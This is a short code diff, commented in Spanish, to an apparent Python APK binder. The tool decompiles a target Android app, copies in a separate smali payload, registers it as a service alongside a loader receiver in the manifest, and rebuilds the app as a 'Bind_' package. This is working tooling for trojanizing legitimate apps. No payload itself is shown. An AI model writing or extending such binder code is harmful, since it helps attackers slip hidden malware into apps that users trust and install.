@@ -146,6 +146,9 @@ def smali_bind(target_apk, smali_bind):
     #Editamos el manifest destino estableciendo los permisos correctos y receiver
     prepare_loader_manifest(target_dir_smali, target_package, loader_class)
 
+    #Inseramos en el manifest destino el service smali
+    prepare_smali_manifest(target_dir_smali, path_smali_bind)
+
     #Copiamos archivo smali en el directorio destino
     copy_smali_file(target_dir_smali, smali_bind, path_smali_bind)
 
@@ -156,11 +159,23 @@ def smali_bind(target_apk, smali_bind):
     subprocess.call([os.path.join("apktool", apktool_bin), "b", target_dir_smali, "Bind_" + target_package + ".apk" ])
 
     #Eliminamos directorios temporales de trabajo
-    shutil.rmtree(target_dir_smali)
+    #shutil.rmtree(target_dir_smali)
 
     print "[+] Completed"
 
     print "[+]", target_apk, "processed"
+
+def prepare_smali_manifest(target_dir_smali, path_smali_bind):
+
+    manifest = minidom.parse(os.path.join(target_dir_smali, ANDROID_MANIFEST))
+    service = manifest.createElement("service")
+    service.setAttribute("android:name", path_smali_bind.replace("/", "."))
+    manifest.getElementsByTagName("application")[0].appendChild(service)
+
+    #Guardamos
+    fo = open(os.path.join(target_dir_smali, ANDROID_MANIFEST), "wt")
+    manifest.writexml(fo)
+    fo.close()
 
 def copy_smali_file(target_dir_smali, smali_bind, path_smali_bind):
 
